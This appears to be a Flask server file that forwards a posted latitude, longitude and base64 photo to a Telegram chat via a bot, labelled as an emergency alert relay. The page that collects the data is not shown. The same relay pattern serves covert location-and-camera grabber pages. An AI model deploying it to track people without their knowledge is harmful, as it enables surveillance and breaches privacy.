# app.py
import os
import base64
import io
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)  # allow Netlify (and any origin). For stricter security, pass origins=['https://your-netlify-site']

# Read from environment variables (set these in Render)
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID   = os.getenv("CHAT_ID")

if not BOT_TOKEN or not CHAT_ID:
    app.logger.warning("BOT_TOKEN or CHAT_ID not set in environment variables.")

@app.route("/", methods=["GET"])
def root():
    return "✅ Telegram Location & Photo Server Running"

@app.route("/send_data", methods=["POST"])
def send_data():
    try:
        data = request.get_json(force=True)
        lat = data.get("lat")
        lon = data.get("lon")
        photo_data = data.get("photo")  # expected as dataURL e.g. "data:image/jpeg;base64,/9j/4AAQ..."

        # Basic validation
        if lat is None or lon is None:
            return jsonify({"ok": False, "error": "Missing lat/lon"}), 400

        # 1) Send location message (Google Maps link)
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        caption_text = f"📍 New Emergency Alert\nLocation: {lat}, {lon}\n{maps_link}"
        msg_resp = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": caption_text}
        )

        # 2) If photo present (data URL), decode and send as file
        photo_resp = None
        if photo_data:
            try:
                # strip header if exists
                if "," in photo_data:
                    header, b64 = photo_data.split(",", 1)
                else:
                    b64 = photo_data
                photo_bytes = base64.b64decode(b64)
                files = {"photo": ("photo.jpg", io.BytesIO(photo_bytes), "image/jpeg")}
                photo_resp = requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                    data={"chat_id": CHAT_ID, "caption": "📷 Photo (from web)"},
                    files=files,
                    timeout=60
                )
            except Exception as e:
                app.logger.exception("Error decoding/sending photo")
                # continue — don't fail entire request
        return jsonify({
            "ok": True,
            "msg_status": msg_resp.json() if msg_resp is not None else None,
            "photo_status": photo_resp.json() if photo_resp is not None else None
        }), 200
    except Exception as e:
        app.logger.exception("Error in /send_data")
        return jsonify({"ok": False, "error": str(e)}), 500

if __name__ == "__main__":
    # For local dev only. Render will use gunicorn.
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))